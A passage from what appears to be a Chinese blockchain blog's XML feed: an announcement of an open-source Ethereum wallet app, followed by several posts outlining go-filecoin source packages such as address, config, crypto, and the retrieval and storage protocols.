    <content type="text"><![CDATA[你是否和我前段时间一样，苦苦的寻找一款好用的开源以太坊钱包，你会发现可用都很少，因为很多钱包说开源，仅仅是开源部分代码，现在不需要再找了。 重要的事情说三遍：这是一个款完全开源，完全免费，功能强大支持DApp浏览器功能的钱包；这是一个款完全开源，完全免费，功能强大支持DApp浏览器功能的钱包；这是一个款完全开源，完全免费，功能强大支持DApp浏览器功能的钱包。 再也不用傻乎乎找人开发以太坊钱包了， 直接拿去用吧；再也不用担心私钥会被上传到别人的服务器上。 写在前面区块链是开放的，很难想象一个封闭的项目如何产生信任，开源一直是区块链社区所倡导的行为准则。我们也希望开源能够降低行业的开发门槛，吸引更多的开发者和公司能够利用我们的代码，找到更多落地的应用场景，一起来推动行业的发展。同时我们也相信开源可以是产品更加的安全，我们也邀请专业的区块链安全团队零时科技来为钱包做安全审计。 效果演示先来看看钱包长什么样吧，我制作了一个gif图片： 19年4月更新：加入 DApp 浏览器 功能 DApp 浏览器，目前暂未开源，需要请加微信：xlbxiong。 Gif 图片比较简陋，见谅见谅，可以看的出来界面参考了现在的主流钱包，感谢imToken及ETHWallet， 大家可以戳链接下载APK体验，Google play 也已经上架，链接 功能介绍目前版本支持一下功能： 支持通过生成助记词、Keystore文件、私钥 创建钱包账号； 支持导出钱包账号助记词、私钥、Keystore文件； 账户余额查询及转账功能； 支持多个钱包账号管理； 支持ERC20 代币（余额显示、转账、代币币价显示）； 历史交易列表显示； 支持DApp Browser 浏览器 二维码扫描，兼容imToken格式； 支持用法币（美元和人民币）实时显示币价； 支持以太坊官方测试网络（Infura Koven及Ropsten）及本地测试网络。 功能够全面吧，尤其是最后一个功能支持以太坊官方测试网络（Infura Koven及Ropsten）及本地测试网络，估计是开发者的最爱，做为开发者的我，懂你们的痛（可以获取到免费的以太币用于测试）。 代码的讲解和相应的课程，我们后面会陆续放出，在还没有放出之前，先提醒大家几个注意的点： 使用本地网络测试的时候注意Geth 或 Ganache 设置下可接收RPC连接的地址，因为默认情况下只支持本地连接，这样手机上就无法连接。 显示交易记录功能需要自己搭建一个服务器提供API接口，这个接口来自TrustWallet，为了和本应用保持版本一致，我Fork了一份，地址为trust-ray，这个库会解析区块，并把交易信息存到MongoDb数据库里，然后用API提供给客户端使用。 实时币价的显示其实也是使用trust-ray提供的接口，trust-ray 使用的是CoinMarketCap的数据，目前使用的是CoinMarketCap免费提供的数据，CoinMarketCap现在有一套新的付费接口，免费的数据可能在将来会停用，到时需要使用CoinMarketCap 的apikey来访问。 代码中ERC20_Contract目录提供了一个ERC20合约给大家部署测试Token功能。 其他的代码介绍及环境搭建大家就只有等我的文章了，大家也可以学习网页钱包开发课程，课程详细介绍了开发钱包必备的理论知识。 有什么需要的功能，可以提issue或加我微信留言。 对了本项目的GitHub地址为：Upchain-wallet, 点 Star 的同学都会发大财，哈哈哈~ 参考的开源项目本钱包在开发是站在巨人的肩膀上完成，特别感谢以下项目： web3j bitcoinj Trust-wallet ETHWallet BGAQRCode Trust-ray 再啰嗦几句本次开源也是受到区块链开源社区的影响，我们深入浅出区块链社区聚集了一批坚持布道朋友，我们的GitHub Group 目前已经开源了10个项目，我们翻译了六份区块链技术文档。 现在深入浅出区块链社区 和 Hi区块链社区 磨链社区强强联合，一起为广大区块链开发者者服务，形成了国内最大的区块链开发者社区。 登链钱包是由登链学院出品，希望大家知道登链学院不单出品优质课程，我们也为行业发展贡献一份力量，感谢大家转发。 想要加入开源钱包讨论群的的朋友，加微信：xlbxiong 备注：钱包 PS: 我们提供专业的钱包定制开发，欢迎咨询微信：xlbxiong 备注：定制开发 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博 掌握区块链技术动态。]]></content>
      <categories>
        <category>以太坊</category>
      </categories>
      <tags>
        <tag>以太坊</tag>
        <tag>钱包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析九：filecoin源码分析之支撑包分析(1)]]></title>
    <url>%2F2019%2F03%2F06%2Ffilecoin-code-analysis-9%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第九章filecoin源码分析之支撑包分析(1)。 目的 简析一些支撑包，便于后面分析的理解 编译相关 bin目录：主要为编译用shell脚本 bls-signatures: 通过cgo编译，导出库及头文件 build: 编译相关 util/version:版本检查 scripts:相关脚本 cborutil 对外提供功能 读取流消息 写入流消息 主要被协议层使用 123456789101112131415161718▼ package cborutil▶ imports▼ constants +MaxMessageSize▼ variables +ErrMessageTooLarge▼+MsgReader : struct [fields] -br : *bufio.Reader [methods] +ReadMsg(i interface&#123;&#125;) : error [functions] +NewMsgReader(r io.Reader) : *MsgReader 123456789101112▼ package cborutil▶ imports▼+MsgWriter : struct [fields] -w : *bufio.Writer [methods] +WriteMsg(i interface&#123;&#125;) : error [functions] +NewMsgWriter(w io.Writer) : *MsgWriter address 对外提供功能 地址相关操作功能 实例化铸币地址、存储市场地址、支付通道地址 实例化两个测试地址 提供主网地址、测试网地址创建接口 提供地址格式转换功能，包含22bytes与41bytes、切片字符串转换、打印。 提供地址的合法性检查功能 地址格式 要与id区分开，id用的是ipfs中的cid,而地址则是filecoin独立定义的。 22 bytes地址：包含1byte网络类型、1byte地址版本、20bytes哈希 41 bytes地址：包含2bytes网络类型、1byte地址版本、32bytes编码值、6bytes校验和 用命令显示的是41bytes格式的地址，address包提供了22bytes与41bytes地址的转换接口 1234567891011121314151617181920212223242526272829303132333435location: address/constants.go▼ package address▶ imports▼ constants // Base32编码的字符集 +Base32Charset // 地址的哈希部分，目前为20 bytes +HashLength, 20bytes，160bit // 地址长度,为HashLength+1+1= 22 bytes +Length // 地址格式的版本定义：当前为0 +Version : byte▼ variables // 基于Base32Charset的Base32实例,用于编解码 +Base32 // Base32 Reverse集合 +Base32CharsetReverse // 铸币地址,基于&quot;filecoin&quot;哈希生成 +NetworkAddress : Address // 支付通道地址 +PaymentBrokerAddress : Address // 存储市场地址 +StorageMarketAddress : Address // 测试地址 +TestAddress : Address // 测试地址 +TestAddress2 : Address▼ functions -init() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283location: address/address.go▼ package address▶ imports▼ constants +Mainnet : Network +Testnet▼ variables // 错误提示 +ErrInvalidBytes +ErrUnknownNetwork +ErrUnknownVersion -generator // 配置输入哈希长度20bytes -hashConfig // Address为22字节字符串▼+Address : []byte [methods] // 转换为编码前地址切片输出 +Bytes() : []byte // 判断地址是否为空 +Empty() : bool // 打印地址信息 +Format(f fmt.State, c rune) // 输出地址中的20bytes哈希值 +Hash() : []byte // 转换为编码后地址切片输出 +MarshalText() : []byte, error // 输出地址的网络类型 +Network() : Network // 转换为41bytes的编码输出 // 2(网络类型)+1(地址版本)+32(base32编码)+6(base32校验位) +String() : string // 编码后地址切片输出转换为字符 +UnmarshalText(in []byte) : error // 获取地址版本号 +Version() : byte // 类型定义 +Network : byte▼ functions // 采用blake2b-160再次哈希 +Hash(input []byte) : []byte // 生成测试网络地址,输入为原始哈希,会执行blake2b-160再次哈希 +MakeTestAddress(input string) : Address // 通过字符串网络类型转换为byte网络类型 // fc:主网转化为0 // tf:测试网化为1 +NetworkFromString(input string) : Network, error // 通过byte网络类型转换为字符串网络类型 // 0:主网转化为fc // 1:测试网化为tf +NetworkToString(n Network) : string // 构建新地址：输入为原始20bytes哈希+网络类型+地址版本 +New(network Network, hash []byte) : Address // 构建新地址：输入为22bytes的原始切片 +NewFromBytes(raw []byte) : Address, error // 通过41bytes的字串串生成22bytes的原始地址 +NewFromString(s string) : Address, error // 构建新地址：输入为原始20bytes哈希,调用New +NewMainnet(hash []byte) : Address // 生成测试网络地址,输入为原始哈希再次哈希,被MakeTestAddress调用 +NewTestnet(hash []byte) : Address // 校验41bytes地址的合法性 +ParseError(addr string) : error // base32编码校验码生成，结果为6bytes -createChecksum(hrp string, data []byte) : []byte // 解码 -decode(addr string) : string, byte, []byte, error // 编码 -encode(hrp string, version byte, data []byte) : string, error -hrpExpand(hrp string) : []byte -init() -polymod(values []byte) : uint32 // 校验和验证 -verifyChecksum(hrp string, data []byte) : bool 123456789101112131415location: address/set.go▼ package address▶ imports▼ variables -addrSetEntry // 地址集合 +Set : map[Address]▼ functions -init() config 对外提供功能 提供对内存中配置的实例化操作 对具体实例的设置和读取 对配置文件的读写 包含API、启动、数据存储、网络连接、挖矿、钱包、心跳相关配置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120▼ package config▶ imports▼ variables // 对特定参数的合法性校验规则集合 // 1 目前只是限定昵称为字符 +Validators▼+APIConfig : struct [fields] // 是否允许跨域请求 +AccessControlAllowCredentials : bool // 允许的方法列表 +AccessControlAllowMethods : []string // 允许的元列表 +AccessControlAllowOrigin : []string // 地址 +Address : string [functions] // 实例化APIconfig -newDefaultAPIConfig() : *APIConfig▼+BootstrapConfig : struct [fields] // 启动地址集合 +Addresses : []string // 最小节点阈值 +MinPeerThreshold : int // 启动时间阈值，目前为10s +Period : string [functions] // 实例化启动配置的接口 -newDefaultBootstrapConfig() : *BootstrapConfig // 存储在内存之中的filecoin配置▼+Config : struct [fields] // API相关 +API : *APIConfig // 启动相关 +Bootstrap : *BootstrapConfig // 数据存储相关 +Datastore : *DatastoreConfig // 心跳相关 +Heartbeat : *HeartbeatConfig // 挖矿相关 +Mining : *MiningConfig // 网络连接相关 +Swarm : *SwarmConfig // 钱包相关 +Wallet : *WalletConfig [methods] // 获取配置，参数为API的上述子结构 +Get(key string) : interface&#123;&#125;, error // 设置配置，参数为API的上述子结构 +Set(dottedKey string, jsonString string) : error // 写对应目录的配置文件 +WriteFile(file string) : error [functions] // 实例化配置，会调用各字节口的实例化 +NewDefaultConfig() : *Config // 读对应目录的配置文件 +ReadFile(file string) : *Config, error▼+DatastoreConfig : struct [fields] // 路径 +Path : string // 类型 +Type : string [functions] -newDefaultDatastoreConfig() : *DatastoreConfig▼+HeartbeatConfig : struct [fields] // 心跳周期 +BeatPeriod : string // 心跳目标 +BeatTarget : string // 昵称 +Nickname : string // 重连时间 +ReconnectPeriod : string [functions] -newDefaultHeartbeatConfig() : *HeartbeatConfig▼+MiningConfig : struct [fields] // 自动密封间隔周期 +AutoSealIntervalSeconds : uint // 区块签名地址 +BlockSignerAddress : address.Address // 矿工地址 +MinerAddress : address.Address // 存储报价 +StoragePrice : *types.AttoFIL [functions] -newDefaultMiningConfig() : *MiningConfig▼+SwarmConfig : struct [fields] // 地址 +Address : string // 转发地址 +PublicRelayAddress : string [functions] -newDefaultSwarmConfig() : *SwarmConfig▼+WalletConfig : struct [fields] // 默认钱包地址 +DefaultAddress : address.Address [functions] -newDefaultWalletConfig() : *WalletConfig▼ functions -validate(dottedKey string, jsonString string) : error -validateLettersOnly(key string, value string) : error crypto 对外提供功能 生成私钥接口 签名接口 私钥转公钥接口 从签名消息中提取公钥接口 验证消息合法性接口 主要用于地址生成、钱包相关 1234567891011121314151617181920212223242526▼ package crypto▶ imports▼ constants // 定义私钥长度32位 +PrivateKeyBytes // 定义公钥长度65位 +PublicKeyBytes▼ functions // 从签名消息中恢复公钥 +EcRecover(msg, signature []byte) : []byte, error // 比较私钥是否相同 +Equals(sk, other []byte) : bool // 生成私钥,调用GenerateKeyFromSeed +GenerateKey() : []byte, error // 生成私钥 +GenerateKeyFromSeed(seed io.Reader) : []byte, error // 由私钥得到公钥 +PublicKey(sk []byte) : []byte // 使用私钥签名 +Sign(sk, msg []byte) : []byte, error // 验证签名合法性 +Verify(pk, msg, signature []byte) : bool util/convert 提供功能 ToCid:转cid功能 functional-tests 测试脚本 flags 通过ldflags注入,表示git提交版本号 1var Commit string fixtures 提供功能 定义不同网络启动相关地址 预先分配初始网络状态，比如代币的预先分配 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354▼ package fixtures▶ imports▼ constants // 开发人员，开发网络启动相关地址 -nightlyFilecoinBootstrap0 : string -nightlyFilecoinBootstrap1 : string -nightlyFilecoinBootstrap2 : string -nightlyFilecoinBootstrap3 : string -nightlyFilecoinBootstrap4 : string // 测试网络启动相关地址 -testFilecoinBootstrap0 : string -testFilecoinBootstrap1 : string -testFilecoinBootstrap2 : string -testFilecoinBootstrap3 : string -testFilecoinBootstrap4 : string // 用户，开发网络启动相关地址 -userFilecoinBootstrap0 : string -userFilecoinBootstrap1 : string -userFilecoinBootstrap2 : string -userFilecoinBootstrap3 : string -userFilecoinBootstrap4 : string▼ variables // 开发人员，开发网络启动相关地址 +DevnetNightlyBootstrapAddrs // 测试网络启动相关地址 +DevnetTestBootstrapAddrs // 用户，开发网络启动相关地址 +DevnetUserBootstrapAddrs // 预生成测试网络地址集合 +TestAddresses : []string // 预生成测试矿工账户集合 +TestMiners : []string // 预生成地址的私钥 -testKeys : []string▼-detailsStruct : struct [fields] // 创世区块cid +GenesisCid : cid.Cid +Keys : []*types.KeyInfo +Miners : []▼ functions // 预生成的Key文件路径 +KeyFilePaths() : []string // 预生成信息 // 1 解析gen.json文件到detailsStruct结构体 // 2 追击Miners信息到TestMiners中 -init() 如下为gen.json文件,可据此预先给特定矿工分配代币 1234567891011121314&#123; &quot;keys&quot;: 5, &quot;preAlloc&quot;: [ &quot;1000000000000&quot;, &quot;1000000000000&quot;, &quot;1000000000000&quot;, &quot;1000000000000&quot;, &quot;1000000000000&quot; ], &quot;miners&quot;: [&#123; &quot;owner&quot;: 0, &quot;power&quot;: 1 &#125;]&#125; filnet 提供功能 节点启动 定期检查连接节点，如果数量不够会链接随机节点 123456789101112location: filnet/address.go▼ package filnet▼ imports gx/ipfs/QmNTCey11oxhb1AxDnQBRHtdhap6Ctud872NjAYPYYXPuc/go-multiaddr gx/ipfs/QmRhFARzTHcFh8wUxwN5KvyTGq73FLC65EfFAhz8Ng7aGb/go-libp2p-peerstore▼ functions // 节点id转换为完整的节点信息，包括所有的多地址格式 +PeerAddrsToPeerInfos(addrs []string) : []pstore.PeerInfo, error 123456789101112131415161718192021222324252627282930313233343536373839404142location: filnet/bootstrap.go▼ package filnet▶ imports▼ variables -log▼+Bootstrapper : struct [fields] // 对应bootstrap +Bootstrap : func([]peer.ID) // 连接超时时间，用于连接随机节点 +ConnectionTimeout : time.Duration // 最小连接节点数量阈值 +MinPeerThreshold : int // 定时检查连接节点数量,小于阈值会处理 +Period : time.Duration // 随机节点切片 -bootstrapPeers : []pstore.PeerInfo -cancel : context.CancelFunc -ctx : context.Context -d : inet.Dialer -dhtBootStarted : bool -h : host.Host -r : routing.IpfsRouting -ticker : *time.Ticker [methods] // 定时调用Bootstrap 检查连接节点数量,小于阈值会处理 +Start(ctx context.Context) // 停止节点 +Stop() // 如果启动节点不够，将会尝试连接随机节点。 -bootstrap(currentPeers []peer.ID) [functions] // 实例化 +NewBootstrapper(bootstrapPeers []pstore.PeerInfo, h host.Host, d inet.Dialer, r routing.IpfsRouting, minPeer int, period time.Duration) : *Bootstrapper▼ functions -hasPID(pids []peer.ID, pid peer.ID) : bool 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析八：filecoin源码分析之协议层检索协议]]></title>
    <url>%2F2019%2F03%2F05%2Ffilecoin-code-analysis-8%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第八章filecoin源码分析之协议层检索协议。 协议概览图 此概览图为当前的实现，整个检索的代码还没有完善 目前的逻辑比较简单，需要指定矿工、内容cid即可进行免费检索 源码信息 version master分支 619b0eb1（2019年３月２日） package retrieval location protocol/retrieval 源码分析检索矿工1234567891011121314151617181920212223242526272829303132333435363738▼ package retrieval▼ imports github.com/filecoin-project/go-filecoin/cborutil github.com/filecoin-project/go-filecoin/proofs/sectorbuilder gx/ipfs/QmTGxDz2CjBucFzPNTiWwzQmTWdrBnzqbqrMucDYMsjuPb/go-libp2p-net gx/ipfs/QmZNkThpqfVXs9GNbexPrfBbXSLNYeKrE7jwFM2oqHbyqN/go-libp2p-protocol gx/ipfs/QmbkT7eMTyXfpeyB3ZMxxcxg7XH8t6uXp49jqzz4HB7BGF/go-log gx/ipfs/Qmd52WKRSwrBK5gUaJKawryZQ5by6UbNB8KVW2Zy6JtbyW/go-libp2p-host io/ioutil▼ constants // 定义检索协议: &quot;/fil/retrieval/free/0.0.0&quot; -retrievalFreeProtocol▼ variables -log▼+Miner : struct [fields] // 矿工节点，参见minerNode -node : minerNode [methods] // 执行具体的检索服务 // 通过解析协议流数据，执行检索动作并返回 -handleRetrievePieceForFree(s inet.Stream) [functions] // 实例化检索矿工 // 设置处理免费检索的handle方法：handleRetrievePieceForFree +NewMiner(nd minerNode) : *Miner▼-minerNode : interface [methods] +Host() : host.Host +SectorBuilder() : sectorbuilder.SectorBuilder 检索客户12345678910111213141516171819202122232425▼ package retrieval▶ imports▼ constants // 检索内容大小限制 +RetrievePieceChunkSize▼+Client : struct [fields] -node : clientNode [methods] // 通过cid进行检索 // 通过协议流，发送检索请求以及接受检索回复和数据 +RetrievePiece(ctx context.Context, minerPeerID peer.ID, pieceCID cid.Cid) : io.ReadCloser, error [functions] // 实例化检索客户 +NewClient(nd clientNode) : *Client▼-clientNode : interface [methods] +Host() : host.Host 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析七：filecoin源码协议层分析之存储协议]]></title>
    <url>%2F2019%2F03%2F05%2Ffilecoin-code-analysis-7%2F</url>
    <content type="text"><![CDATA[我是先河系统CTO杨尉，欢迎大加关注的的Github: waynewyang，本文是filecoin技术架构分析系列文章第七章filecoin源码协议层分析之存储协议。 协议概览图 源码信息 version master分支 619b0eb1（2019年３月２日） package storage location protocol/storage 源码分析存储矿工123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202▼ package storage▶ imports▼ constants //等待密封数据前缀 -dealsAwatingSealDatastorePrefix // 存储交易协议名称：&quot;/fil/storage/mk/1.0.0&quot; -makeDealProtocol // 矿工数据存储前缀 -minerDatastorePrefix // 存储查询协议名称：&quot;/fil/storage/qry/1.0.0&quot; -queryDealProtocol // Gas及Gas限制 -submitPostGasLimit -submitPostGasPrice // 支付通道建立等待时间 -waitForPaymentChannelDuration▼ variables -log▼+Miner : struct [fields] // 交易集合 -deals : map[cid.Cid]*storageDeal // 等待密封结构体 -dealsAwaitingSeal : *dealsAwaitingSealStruct // 交易的资源对象 -dealsDs : repo.Datastore // 交易锁 -dealsLk : sync.Mutex // 存储矿工地址 -minerAddr : address.Address // 节点的Owner地址 -minerOwnerAddr : address.Address // 节点对象，有定义存储矿工必须实现的接口 -node : node // 存储矿工的高层API -porcelainAPI : minerPorcelain // 是否在生成时空证明中,以及对应的锁 -postInProcess : *types.BlockHeight -postInProcessLk : sync.Mutex // 接受交易以及拒绝交易 -proposalAcceptor : func(ctx context.Context, m *Miner, p *DealProposal) *DealResponse, error -proposalRejector : func(ctx context.Context, m *Miner, p *DealProposal, reason string) *DealResponse, error [methods] // 密封消息提交到区块链时候，所执行的回调函数,在node中执行 // 1 失败，则调用dealsAwaitingSeal.fail // 2 成功，则调用dealsAwaitingSeal.success // 3 成功之后，需要保存密封扇区信息，如果失败调用dealsAwaitingSeal.fail +OnCommitmentAddedToChain(sector *sectorbuilder.SealedSectorMetadata, err error) // 新区块产生的回调，由node调用,它将会触发新的存储证明 // 如果时空证明过期，将会在新的周期重新出发时空证明 +OnNewHeaviestTipSet(ts types.TipSet) // 由handleQueryDeal调用,返回查询结果 +Query(ctx context.Context, c cid.Cid) : *DealResponse // 生成时空证明 -generatePoSt(commRs []proofs.CommR, challenge proofs.PoStChallengeSeed) : proofs.PoStProof, []uint64, error // 获取支付通道信息 // 1 等待支付通道建立完成 // 2 获取支付通道信息并返回 // 3 支付信息包括：合约地址、支付者地址、通道信息、支付通道消息cid、支付凭证合集 -getPaymentChannel(ctx context.Context, p *DealProposal) : *paymentbroker.PaymentChannel, error // 获取新的时空证明时间 -getProvingPeriodStart() : *types.BlockHeight, error // 获取存储矿工的特定交易 -getStorageDeal(c cid.Cid) : *storageDeal // 获取存储矿工报价 -getStoragePrice() : *types.AttoFIL, error // 存储交易请求的入口方法,交易请求流的handle函数 // 1 读取流中交易请求信息 // 2 调用receiveStorageProposal处理交易请求 // 3 回复处理回复 -handleMakeDeal(s inet.Stream) //解析具体流信息，处理查询请求，会调用Query请求 -handleQueryDeal(s inet.Stream) // 从资源目录中加载交易信息到Miner实例中 -loadDeals() : error // 加载待密封的信息 -loadDealsAwaitingSeal() : error // 密封失败，更新响应信息 -onCommitFail(dealCid cid.Cid, message string) // 密封成功，更新响应信息 // 1 切换状态至Posted // 2 更新证明信息：扇区ID,副本信息，原始数据信息 -onCommitSuccess(dealCid cid.Cid, sector *sectorbuilder.SealedSectorMetadata) // 处理存储交易 // 1,获取存储交易信息 // 2,数据处理，密封 -processStorageDeal(c cid.Cid) // 处理交易请求 // 1 检查签名的正确性 // 2 检查支付信息正确性,调用validateDealPayment方法 // 3 不合法调用proposalRejector(rejectProposal)拒绝请求;合法调用proposalAcceptor(acceptProposal)回复 -receiveStorageProposal(ctx context.Context, sp *SignedDealProposal) : *DealResponse, error // 从Miner对象中存储交易信息到资源目录中 -saveDeal(proposalCid cid.Cid) : error // 存储待密封信息至资源目录 -saveDealsAwaitingSeal() : error // 提交时空证明 // 1 产生随机种子 // 2 根据时空证明输入长度，生成副本切片 // 3 随机种子＋副本切片作为输入生成时空证明 // 4 调用高层接口发送消息 -submitPoSt(start, end *types.BlockHeight, inputs []generatePostInput) // 更新交易响应消息 -updateDealResponse(proposalCid cid.Cid, f func(*DealResponse)) : error // 检查支付信息的正确性 // 1 客户出价必须高于矿工报价 // 2 收款人必须为本节点矿工 // 3 支付通道总资金必须大于矿工报价 // 4 必须有交易凭证，且交易凭证总金额必须大于矿工报价 -validateDealPayment(ctx context.Context, p *DealProposal) : error [functions] // 实例化存储矿工 // 1 通过node传参赋值 // 2 指定密封成功失败的回调函数 // 3 设置交易请求以及交易查询的流handle方法 +NewMiner(ctx context.Context, minerAddr, minerOwnerAddr address.Address, nd node, dealsDs repo.Datastore, porcelainAPI minerPorcelain) : *Miner, error▼-dealsAwaitingSealStruct : struct [fields] // 从扇区id获取失败信息 +FailedSectors : map[uint64]string // 从扇区id获取交易的cid +SectorsToDeals : map[uint64][]cid.Cid // 从扇区id获取sector元数据 +SuccessfulSectors : map[uint64]*sectorbuilder.SealedSectorMetadata -l : sync.Mutex // 失败处理回调，在实例化Miner指向onCommitFail -onFail : func(dealCid cid.Cid, message string) // 成功处理回调,在实例化Miner指向onCommitSuccess -onSuccess : func(dealCid cid.Cid, sector *sectorbuilder.SealedSectorMetadata) [methods] // 对数据进行密封 -add(sectorID uint64, dealCid cid.Cid) // 密封失败处理dealsAwaitingSeal.onFail -fail(sectorID uint64, message string) // 密封成功处理dealsAwaitingSeal.onSuccess -success(sector *sectorbuilder.SealedSectorMetadata)▼-generatePostInput : struct [fields] // 副本merkle根 -commD : proofs.CommD // 原始数据merkle根 -commR : proofs.CommR // 中间数据merkle根 -commRStar : proofs.CommRStar // 扇区ID -sectorID : uint64▼-storageDeal : struct [fields] // 交易请求结构体 +Proposal : *DealProposal // 交易请求响应结构体 +Response : *DealResponse // 存储矿工高层API▼-minerPorcelain : interface [methods] // 区块高度 +ChainBlockHeight(ctx context.Context) : *types.BlockHeight, error // 获取配置 +ConfigGet(dottedPath string) : interface&#123;&#125;, error // 发送、查询、等待消息 +MessageQuery(ctx context.Context, optFrom, to address.Address, method string, params ...interface&#123;&#125;) : [][]byte, *exec.FunctionSignature, error +MessageSend(ctx context.Context, from, to address.Address, value *types.AttoFIL, gasPrice types.AttoFIL, gasLimit types.GasUnits, method string, params ...interface&#123;&#125;) : cid.Cid, error +MessageWait(ctx context.Context, msgCid cid.Cid, cb func(*types.Block, *types.SignedMessage, *types.MessageReceipt) error) : error▼-node : interface [methods] // 区块高度 +BlockHeight() : *types.BlockHeight, error // 区块服务，存储/查询服务 +BlockService() : bserv.BlockService // 区块时间 +GetBlockTime() : time.Duration // 主机信息 +Host() : host.Host // 扇区创建,具体包含 // 1 增加、读取piece; // 2 密封所有非空分期扇区 // 3 密封结果通过返回，通过通道channel的方式 // 4 获取扇区中最大的piece字节大小 // 5 生成时空证明 +SectorBuilder() : sectorbuilder.SectorBuilder▼ functions // 存储交易信息之后，调用processStorageDeal处理交易信息 -acceptProposal(ctx context.Context, sm *Miner, p *DealProposal) : *DealResponse, error // 获取具体文件大小 -getFileSize(ctx context.Context, c cid.Cid, dserv ipld.DAGService) : uint64, error -init() // 存储交易信息,更新响应消息，并返回 -rejectProposal(ctx context.Context, sm *Miner, p *DealProposal, reason string) : *DealResponse, error 存储客户123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128▼ package storage▼ imports▼ constants +ChannelExpiryInterval // Gas及Gas限制 +CreateChannelGasLimit +CreateChannelGasPrice +ErrDupicateDeal // 建立Voucher的周期 +VoucherInterval // 存储前缀 -clientDatastorePrefix▼ variables +Errors▼+Client : struct [fields] // 存储客户高层API -api : clientPorcelainAPI // 交易集合 -deals : map[cid.Cid]*clientDeal // 交易资源目录对象及锁 -dealsDs : repo.Datastore -dealsLk : sync.Mutex // 存储客户节点 -node : clientNode [methods] // 加载特定交易的凭证 +LoadVouchersForDeal(dealCid cid.Cid) : []*paymentbroker.PaymentVoucher, error // 发起存储交易 // 1 获取文件大小、矿工报价、区块高度、目的地址 // 2 建立支付通道 // 3 调用MakeProtocolRequest发起交易请求 // 4 检查交易响应 // 5 持久化交易响应并回复 +ProposeDeal(ctx context.Context, miner address.Address, data cid.Cid, askID uint64, duration uint64, allowDuplicates bool) : *DealResponse, error // 查询交易 // 1 获取矿工信息，地址、节点ID // 2 调用MakeProtocolRequest发起请求 +QueryDeal(ctx context.Context, proposalCid cid.Cid) : *DealResponse, error // 检查交易响应 -checkDealResponse(ctx context.Context, resp *DealResponse) : error // 判断是否为重复交易 -isMaybeDupDeal(p *DealProposal) : bool // 加载交易信息 -loadDeals() : error // 返回目标矿工地址 -minerForProposal(c cid.Cid) : address.Address, error // 持久化交易响应 -recordResponse(resp *DealResponse, miner address.Address, p *DealProposal) : error // 保存交易信息 -saveDeal(cid cid.Cid) : error [functions] // 实例化存储客户 +NewClient(nd clientNode, api clientPorcelainAPI, dealsDs repo.Datastore) : *Client, error▼+ClientNodeImpl : struct [fields] -blockTime : time.Duration -dserv : ipld.DAGService -host : host.Host [methods] //实现clientNode接口 +GetBlockTime() : time.Duration // 获取文件大小 +GetFileSize(ctx context.Context, c cid.Cid) : uint64, error // 发起协议请求 // 1 建立对应的存储交易或者请求的协议流 // 2 发起请求 +MakeProtocolRequest(ctx context.Context, protocol protocol.ID, peer peer.ID, request interface&#123;&#125;, response interface&#123;&#125;) : error [functions] // 实例化客户节点 +NewClientNodeImpl(ds ipld.DAGService, host host.Host, bt time.Duration) : *ClientNodeImpl▼-clientDeal : struct [fields] // 目标矿工，请求及响应 +Miner : address.Address +Proposal : *DealProposal +Response : *DealResponse▼-clientNode : interface // 由ClientNodeImpl实现 [methods] +GetBlockTime() : time.Duration +GetFileSize(context.Context, cid.Cid) : uint64, error +MakeProtocolRequest(ctx context.Context, protocol protocol.ID, peer peer.ID, request interface&#123;&#125;, response interface&#123;&#125;) : error▼-clientPorcelainAPI : interface [embedded] +types.Signer [methods] // 获取区块高度 +ChainBlockHeight(ctx context.Context) : *types.BlockHeight, error // 创建支付通道 // 包括源及目的地址，价格，时间，支付间隔，通道超时时间，Gas及限制 +CreatePayments(ctx context.Context, config porcelain.CreatePaymentsParams) : *porcelain.CreatePaymentsReturn, error // 获取目标地址 +GetAndMaybeSetDefaultSenderAddress() : address.Address, error // 获取矿工报价 +MinerGetAsk(ctx context.Context, minerAddr address.Address, askID uint64) : miner.Ask, error // 获取矿工Owner地址 +MinerGetOwnerAddress(ctx context.Context, minerAddr address.Address) : address.Address, error // 获取矿工节点ID +MinerGetPeerID(ctx context.Context, minerAddr address.Address) : peer.ID, error▼ functions -init() 深入浅出区块链 - 系统学习区块链，打造最好的区块链技术博客]]></content>
      <categories>
        <category>FileCoin</category>
      </categories>
      <tags>
        <tag>FileCoin</tag>
        <tag>源码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[filecoin技术架构分析六:filecoin源码协议层分析之hello握手协议]]></title>
    <url>%2F2019%2F03%2F04%2Ffilecoin-code-analysis-6%2F</url>
